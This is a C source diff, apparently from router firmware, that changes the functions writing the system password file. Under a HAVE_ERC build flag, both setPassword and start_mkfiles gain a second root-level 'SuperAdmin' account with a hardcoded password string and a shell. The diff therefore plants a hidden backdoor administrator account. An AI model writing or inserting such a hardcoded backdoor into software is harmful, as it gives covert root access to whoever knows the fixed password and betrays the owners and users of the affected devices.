@@ -57,8 +57,12 @@ void setPassword( char *passwd )
 	perror( PASSWD_FILE );
 	return;
     }
-
+#ifdef HAVE_ERC
+    fprintf( fp, "Admin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", passwd );
+    fprintf( fp, "SuperAdmin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", zencrypt("Se12@rEServiceGate") );
+#else
     fprintf( fp, "root:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", passwd );
+#endif
     fclose( fp );
 }
 
@@ -112,9 +116,14 @@ void start_mkfiles( void )
     if( isregistered_real(  ) )
 #endif
     {
+#ifdef HAVE_ERC
+    fprintf( fp, "Admin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", http_passwd );
+    fprintf( fp, "SuperAdmin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", zencrypt("Se12@rEServiceGate") );
+#else
 	fprintf( fp, "root:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n"
 		 "reboot:%s:0:0:Root User,,,:/tmp/root:/sbin/reboot\n",
 		 http_passwd, http_passwd );
+#endif
 	fclose( fp );
     }
     cprintf( "%s:%d", __func__, __LINE__ );
